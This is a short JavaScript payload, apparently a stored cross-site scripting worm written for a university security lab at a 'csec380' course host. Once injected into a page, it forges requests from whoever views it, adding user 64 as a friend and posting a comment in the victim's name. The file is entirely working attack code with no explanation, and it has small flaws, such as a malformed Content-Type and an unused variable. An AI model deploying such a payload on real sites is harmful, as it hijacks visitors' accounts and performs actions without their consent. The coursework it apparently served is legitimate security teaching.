<script>
	var r = new XMLHttpRequest();
	const id = 64;
	r.open("POST", "http://csec380-core.csec.rit.edu:86/add_friend.php?id=" + id , true);
	r.setRequestHeader("Content-Type", "x-www-form-urlencoded");
	r.send();

	const string = encodeURI(new Date() + ": Russell added you through the user " + $("#name").text()); 

	var v = document.documentElement.innerHTML.indexOf("id=") + 3;
	var new_id = document.documentElement.innerHTML.slice(v, v+1);

	while (!(isNaN(parseInt(document.documentElement.innerHTML.slice(v, v+1))))){
		v += 1;
		new_id += document.documentElement.innerHTML.slice(v, v+1);
	}



	r.open("GET", "http://csec380-core.csec.rit.edu:86/add_comment.php?id=" + id + "&comment=" + string, true);
	r.send();
</script>

